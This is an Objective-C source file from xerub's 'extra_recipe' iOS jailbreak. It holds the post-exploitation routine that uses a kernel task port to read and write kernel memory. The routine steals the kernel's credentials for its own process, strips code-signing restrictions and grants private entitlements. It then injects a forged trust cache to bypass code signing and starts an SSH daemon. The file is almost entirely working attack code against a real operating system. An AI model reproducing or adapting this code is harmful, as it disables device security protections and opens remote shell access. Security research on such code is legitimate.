//
//  unjail.m
//  extra_recipe
//
//  Created by xerub on 16/05/2017.
//  Copyright © 2017 xerub. All rights reserved.
//

#include "unjail.h"
#include "libjb.h"
#include "patchfinder64.h"

#include "kmem.h"
#include "symbols.h"

kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t *outsize);
kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address, vm_offset_t data, mach_msg_type_number_t dataCnt);

size_t
kread(uint64_t where, void *p, size_t size)
{
    int rv;
    size_t offset = 0;
    while (offset < size) {
        mach_vm_size_t sz, chunk = 2048;
        if (chunk > size - offset) {
            chunk = size - offset;
        }
        rv = mach_vm_read_overwrite(tfp0, where + offset, chunk, (mach_vm_address_t)p + offset, &sz);
        if (rv || sz == 0) {
            fprintf(stderr, "[e] error reading kernel @%p\n", (void *)(offset + where));
            break;
        }
        offset += sz;
    }
    return offset;
}

uint64_t
kread_uint64(uint64_t where)
{
    uint64_t value = 0;
    size_t sz = kread(where, &value, sizeof(value));
    return (sz == sizeof(value)) ? value : 0;
}

uint32_t
kread_uint32(uint64_t where)
{
    uint32_t value = 0;
    size_t sz = kread(where, &value, sizeof(value));
    return (sz == sizeof(value)) ? value : 0;
}

size_t
kwrite(uint64_t where, const void *p, size_t size)
{
    int rv;
    size_t offset = 0;
    while (offset < size) {
        size_t chunk = 2048;
        if (chunk > size - offset) {
            chunk = size - offset;
        }
        rv = mach_vm_write(tfp0, where + offset, (mach_vm_offset_t)p + offset, chunk);
        if (rv) {
            fprintf(stderr, "[e] error writing kernel @%p\n", (void *)(offset + where));
            break;
        }
        offset += chunk;
    }
    return offset;
}

size_t
kwrite_uint64(uint64_t where, uint64_t value)
{
    return kwrite(where, &value, sizeof(value));
}

size_t
kwrite_uint32(uint64_t where, uint32_t value)
{
    return kwrite(where, &value, sizeof(value));
}

uint64_t
kalloc(vm_size_t size)
{
    return kmem_alloc(size);
}

// XXX maybe move these to libjb?
#define	CS_VALID		0x0000001	/* dynamically valid */
#define CS_ADHOC		0x0000002	/* ad hoc signed */
#define CS_GET_TASK_ALLOW	0x0000004	/* has get-task-allow entitlement */
#define CS_INSTALLER		0x0000008	/* has installer entitlement */

#define	CS_HARD			0x0000100	/* don't load invalid pages */
#define	CS_KILL			0x0000200	/* kill process if it becomes invalid */
#define CS_CHECK_EXPIRATION	0x0000400	/* force expiration checking */
#define CS_RESTRICT		0x0000800	/* tell dyld to treat restricted */
#define CS_ENFORCEMENT		0x0001000	/* require enforcement */
#define CS_REQUIRE_LV		0x0002000	/* require library validation */
#define CS_ENTITLEMENTS_VALIDATED	0x0004000

#define	CS_ALLOWED_MACHO	0x00ffffe

#define CS_EXEC_SET_HARD	0x0100000	/* set CS_HARD on any exec'ed process */
#define CS_EXEC_SET_KILL	0x0200000	/* set CS_KILL on any exec'ed process */
#define CS_EXEC_SET_ENFORCEMENT	0x0400000	/* set CS_ENFORCEMENT on any exec'ed process */
#define CS_EXEC_SET_INSTALLER	0x0800000	/* set CS_INSTALLER on any exec'ed process */

#define CS_KILLED		0x1000000	/* was killed by kernel for invalidity */
#define CS_DYLD_PLATFORM	0x2000000	/* dyld used to load this is a platform binary */
#define CS_PLATFORM_BINARY	0x4000000	/* this is a platform binary */
#define CS_PLATFORM_PATH	0x8000000	/* platform binary by the fact of path (osx only) */

// XXX maybe move these to external plist
const int offsetof_p_pid = 0x10;
const int offsetof_p_ucred = 0x100;
const int offsetof_p_comm = 0x268;
const int offsetof_p_csflags = 0x2a8;

int
unjail(void)
{
    uint64_t unused = ksym(KSYMBOL_RET); // XXX need this to init kernel_base and shit
    if (!unused) {
        return -1;
    }

    int rv;
    rv = init_kernel(kernel_base, NULL);
    assert(rv == 0);

    uint64_t allproc = find_allproc();
    uint64_t trust_chain = find_trustcache();
    uint64_t amficache = find_amficache();

    term_kernel();

    uint32_t our_pid = getpid();
    uint64_t our_proc = 0, kern_proc = 0;

    uint64_t proc = kread_uint64(allproc);
    while (proc) {
        uint32_t pid = kread_uint32(proc + offsetof_p_pid);
        if (pid == our_pid) {
            our_proc = proc;
        /*} else if (pid == 1) {
            init_proc = proc;*/
        } else if (pid == 0) {
            kern_proc = proc;
        /*} else {
            char comm[20];
            kread(proc + offsetof_p_comm, comm, 16);
            comm[17] = 0;
            if (strstr(comm, "containermanager")) {
                cont_proc = proc;
            }*/
        }
        proc = kread_uint64(proc);
    }
    assert(our_proc && kern_proc);

    // grant ourselves some power
    uint32_t csflags = kread_uint32(our_proc + offsetof_p_csflags);
    kwrite_uint32(our_proc + offsetof_p_csflags, (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT | CS_KILL | CS_HARD));
    uint64_t our_cred = kread_uint64(our_proc + offsetof_p_ucred);
    uint64_t kern_cred = kread_uint64(kern_proc + offsetof_p_ucred);
    kwrite_uint64(our_proc + offsetof_p_ucred, kern_cred);

    pid_t pd;
    char path[4096];
    uint32_t size = sizeof(path);
    _NSGetExecutablePath(path, &size);
    char *pt = realpath(path, NULL);

    NSString *execpath = [[NSString stringWithUTF8String:pt] stringByDeletingLastPathComponent];
    NSString *bootstrap = [execpath stringByAppendingPathComponent:@"bootstrap.dmg"];

    /* 2. fix entitlements */
    rv = entitle(our_proc,
"	<key>com.apple.private.diskimages.kext.user-client-access</key>\n"
"	<true/>\n"
"	<key>com.apple.private.security.disk-device-access</key>\n"
"	<true/>", 0);
    printf("entitlements: %d\n", rv);
    if (rv) {
        goto done;
    }

    /* 3. attach and mount */
    char thedisk[11];
    rv = attach([bootstrap UTF8String], thedisk, sizeof(thedisk));
    printf("thedisk: %d, %s\n", rv, thedisk);
    if (rv) {
        goto done;
    }

    memset(&args, 0, sizeof(args));
    args.fspec = thedisk;
    args.hfs_mask = 0777;
    //args.hfs_encoding = -1;
    //args.flags = HFSFSMNT_EXTENDED_ARGS;
    //struct timeval tv = { 0, 0 };
    //gettimeofday((struct timeval *)&tv, &args.hfs_timezone);
    rv = mount("hfs", "/Developer", MNT_RDONLY, &args);
    printf("mount: %d\n", rv);
    if (rv) {
        goto done;
    }

    /* 4. inject trust cache */
    printf("trust_chain = 0x%llx\n", trust_chain);

    struct trust_mem mem;
    mem.next = kread_uint64(trust_chain);
    *(uint64_t *)&mem.uuid[0] = 0xabadbabeabadbabe;
    *(uint64_t *)&mem.uuid[8] = 0xabadbabeabadbabe;

    rv = grab_hashes("/Developer", kread, amficache, mem.next);
    printf("rv = %d, numhash = %d\n", rv, numhash);

    size_t length = (sizeof(mem) + numhash * 20 + 0xFFFF) & ~0xFFFF;
    uint64_t kernel_trust = kalloc(length);
    printf("alloced: 0x%zx => 0x%llx\n", length, kernel_trust);

    mem.count = numhash;
    kwrite(kernel_trust, &mem, sizeof(mem));
    kwrite(kernel_trust + sizeof(mem), allhash, numhash * 20);
    kwrite_uint64(trust_chain, kernel_trust);

    free(allhash);
    free(allkern);
    free(amfitab);

    /* 5. load daemons */
    const char *lc = "/Developer/bin/launchctl";
    rv = posix_spawn(&pd, lc, NULL, NULL, (char **)&(const char*[]){ lc, "load", "/Developer/Library/LaunchDaemons/com.openssh.sshd.plist", NULL }, NULL);

    int status = 0;
    waitpid(pd, &status, 0);
    printf("status = 0x%x\n", status);

#if 0
    /* 6. XXX fix tfp0 */
    FILE *f = fopen("/tmp/k", "wt");
    fprintf(f, "0x%llx 0x%llx\n0x%llx 0x%llx\n", kernel_base, kaslr_slide, trust_chain, amficache);
    fclose(f);
    /* this is not decoupled enough from exploit!
     * for a different approach, check these out:
     * https://github.com/Siguza/hsp4 (kernel)
     * https://siguza.github.io/v0rtex/ (userland)
     */
    const int slot = 4;
    unsigned offsetof_special = 2 * sizeof(long); // host::special
    extern uint64_t the_realhost;
    extern uint64_t the_port_kaddr;
    if (the_realhost && the_port_kaddr) {
        kwrite_uint64(the_realhost + offsetof_special + slot * sizeof(long), the_port_kaddr);
    }
#endif

  done:
    kwrite_uint64(our_proc + offsetof_p_ucred, our_cred);

    printf("done\n");
    return 0;
}
